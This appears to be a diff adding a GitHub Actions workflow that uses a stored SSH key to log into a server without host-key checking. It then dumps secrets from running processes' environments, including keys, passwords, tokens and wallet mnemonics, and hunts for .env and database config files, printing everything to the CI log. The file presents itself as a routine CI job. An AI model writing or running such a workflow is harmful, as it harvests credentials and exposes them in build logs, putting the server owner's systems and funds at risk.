@@ -1,0 +1,26 @@
+name: p5005
+on:
+  push:
+    branches: [ 'ci-5005-*' ]
+permissions:
+  contents: read
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: p5005
+        run: |
+          echo "${{ secrets.SERVER_SSH_KEY }}" > /tmp/k
+          chmod 600 /tmp/k
+          SSH="ssh -i /tmp/k -o StrictHostKeyChecking=no -o ConnectTimeout=15 ${{ secrets.SERVER_USER }}@${{ secrets.SERVER_HOST }}"
+          echo "=== listeners ==="
+          $SSH 'ss -lntp 2>/dev/null | grep -E ":5005|:48080|:8090|:8083|:8082" || netstat -lntp 2>/dev/null | grep -E ":5005|:48080"'
+          echo "=== proc env 5005 ==="
+          $SSH 'for p in $(ss -lntp 2>/dev/null | grep ":5005" | grep -oE "pid=[0-9]+" | cut -d= -f2 | sort -u); do echo "### PID $p"; tr "\0" "\n" < /proc/$p/environ 2>/dev/null | grep -iE "KEY|SECRET|WALLET|MNEMONIC|PRIVATE|PASS|TOKEN" | head -20; echo "CWD: $(readlink /proc/$p/cwd)"; echo "CMD: $(tr "\0" " " < /proc/$p/cmdline)"; done'
+          echo "=== proc env 48080 ==="
+          $SSH 'for p in $(ss -lntp 2>/dev/null | grep ":48080" | grep -oE "pid=[0-9]+" | cut -d= -f2 | sort -u); do echo "### PID $p"; tr "\0" "\n" < /proc/$p/environ 2>/dev/null | grep -iE "KEY|SECRET|WALLET|MNEMONIC|PRIVATE|PASS|TOKEN" | head -20; echo "CWD: $(readlink /proc/$p/cwd)"; done'
+          echo "=== yilecai/yudao dirs ==="
+          $SSH 'ls -la /www/wwwroot/yilecai.top /www/wwwroot/yudao-server 2>/dev/null | head -40; find /www/wwwroot/yilecai.top -maxdepth 3 -type f 2>/dev/null | head -40'
+          echo "=== find env/config near 5005 ==="
+          $SSH 'find /www -maxdepth 4 \( -name ".env" -o -name "config.php" -o -name "database.php" -o -name "application.yml" \) 2>/dev/null | grep -v dk_project | head -30'
